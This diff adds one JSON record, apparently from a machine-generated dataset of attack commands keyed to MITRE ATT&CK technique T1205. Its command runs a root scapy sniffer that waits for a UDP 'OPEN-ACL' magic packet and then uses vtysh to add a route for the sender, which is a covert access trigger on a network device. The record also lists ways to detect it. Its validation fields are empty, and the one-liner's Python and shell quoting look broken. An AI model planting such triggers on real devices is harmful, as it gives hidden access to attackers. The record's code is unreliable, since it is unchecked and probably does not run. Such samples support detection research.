@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo bash -c 'python3 -c \"from scapy.all import sniff,Raw,IP; import os; SRC=None; def cb(p):\\n  global SRC\\n  if p.haslayer(Raw) and b\\\"OPEN-ACL\\\" in bytes(p[Raw].load):\\n    SRC=p[IP].src\\n    return True\\n  return False\\nsniff(filter=\\\"udp and dst port 49000\\\", stop_filter=cb, store=0); os.system(f\\\"vtysh -c 'conf t' -c 'ip route {SRC}/32 192.0.2.254'\\\")\"'",
+  "explanation": "Sniffs for a UDP magic packet carrying the string 'OPEN-ACL' to port 49000; on detection, dynamically adds a /32 route for the sender via vtysh to allow targeted access. Detection: IDS rule for magic string, and continuous monitoring of new host routes added to FRR.",
+  "rationale_steps": [
+    "Use scapy to sniff for a UDP packet containing a pre-shared magic token.",
+    "Extract source IP and add a precise /32 static route to enable restricted device reachability.",
+    "Detect via content-based IDS/IPS signatures and FRR static route monitoring with config diffs."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-e71f7f24-32fd766d",
+  "source_prompt_hash": "e71f7f24",
+  "timestamp_utc": "2025-09-30T06:04:49.943820Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
